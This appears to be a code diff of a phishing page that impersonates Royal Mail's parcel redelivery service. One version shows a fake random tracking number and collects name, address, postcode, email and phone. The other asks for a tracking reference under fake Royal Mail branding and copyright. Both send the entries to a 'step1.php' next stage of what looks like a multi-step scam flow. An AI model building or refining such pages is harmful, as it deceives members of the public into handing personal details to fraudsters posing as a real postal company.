@@ -1,61 +1,63 @@
-<?php require 'config.php'; ?>
+<?php
+session_start();
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Royal Mail - Redeliver your parcel</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Book a redelivery | Royal Mail</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        body { background:#f4f4f4; }
-        .rm-header { background:#003087; color:white; padding:20px 0; }
-        .card { border:3px solid #003087; border-radius:8px; }
+        body { font-family: Arial, sans-serif; margin:0; background:#f4f4f4; }
+        .header { background:#2A2A2D; color:white; padding:15px 0; }
+        .logo { font-size:28px; font-weight:bold; }
+        .container { max-width:1100px; margin:30px auto; background:white; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
+        .content { padding:40px; }
+        h1 { color:#2A2A2D; }
+        .form-group { margin-bottom:20px; }
+        label { display:block; margin-bottom:8px; font-weight:600; }
+        input[type="text"] { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; }
+        button { background:#e4002b; color:white; padding:14px 30px; border:none; font-size:16px; cursor:pointer; border-radius:4px; }
+        button:hover { background:#c40025; }
+        .rm-footer { background:#2A2A2D; color:#ccc; padding:30px; text-align:center; font-size:14px; }
     </style>
 </head>
 <body>
-<div class="rm-header text-center">
-    <h2>Royal Mail</h2>
-    <h5>Redelivery & Reschedule</h5>
-</div>
 
-<div class="container mt-5">
-    <div class="row justify-content-center">
-        <div class="col-md-6">
-            <div class="card shadow">
-                <div class="card-header bg-primary text-white text-center">
-                    <strong>Your parcel needs a new delivery date</strong>
-                </div>
-                <div class="card-body">
-                    <p class="text-center">Tracking: <strong>RM<?php echo rand(100000000,999999999); ?>UK</strong></p>
-                    
-                    <form action="step1.php" method="POST">
-                        <div class="mb-3">
-                            <label class="form-label">Full Name</label>
-                            <input type="text" name="fullname" class="form-control" required>
-                        </div>
-                        <div class="mb-3">
-                            <label class="form-label">Full Delivery Address</label>
-                            <textarea name="address" class="form-control" rows="3" required></textarea>
-                        </div>
-                        <div class="row">
-                            <div class="col-6">
-                                <input type="text" name="postcode" class="form-control" placeholder="Postcode" required>
-                            </div>
-                            <div class="col-6">
-                                <input type="email" name="email" class="form-control" placeholder="Email Address" required>
-                            </div>
-                        </div>
-                        <div class="mb-3 mt-3">
-                            <label>Phone Number</label>
-                            <input type="tel" name="phone" class="form-control" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary w-100">Continue →</button>
-                    </form>
-                    <small class="text-muted d-block text-center mt-3">© Royal Mail 2025 • Secure Site</small>
-                </div>
-            </div>
-        </div>
+<div class="header">
+    <div style="max-width:1100px;margin:auto;display:flex;align-items:center;justify-content:space-between;padding:0 20px;">
+        <div class="logo">Royal Mail</div>
+        <div>Book a Redelivery</div>
     </div>
 </div>
+
+<div class="container">
+    <div class="content">
+        <h1>Book a redelivery</h1>
+        <p>Enter your booking or tracking reference to get started.</p>
+
+        <form action="step1.php" method="POST">
+            <div class="form-group">
+                <label for="booking">Booking ID or Tracking Number</label>
+                <input type="text" id="booking" name="booking_id" placeholder="e.g. RM123456789GB or 1Z999X999999" required>
+            </div>
+
+            <button type="submit">Continue →</button>
+        </form>
+
+        <p style="margin-top:30px;font-size:14px;color:#666;">
+            You can find this on your Royal Mail notification or tracking email.
+        </p>
+    </div>
+</div>
+
+<div class="rm-footer">
+    © Royal Mail Group Limited 2025<br>
+    <a href="#" style="color:#ccc;margin:0 10px;">Privacy</a>
+    <a href="#" style="color:#ccc;margin:0 10px;">Terms</a>
+    <a href="#" style="color:#ccc;margin:0 10px;">Cookies</a>
+</div>
+
 </body>
 </html>
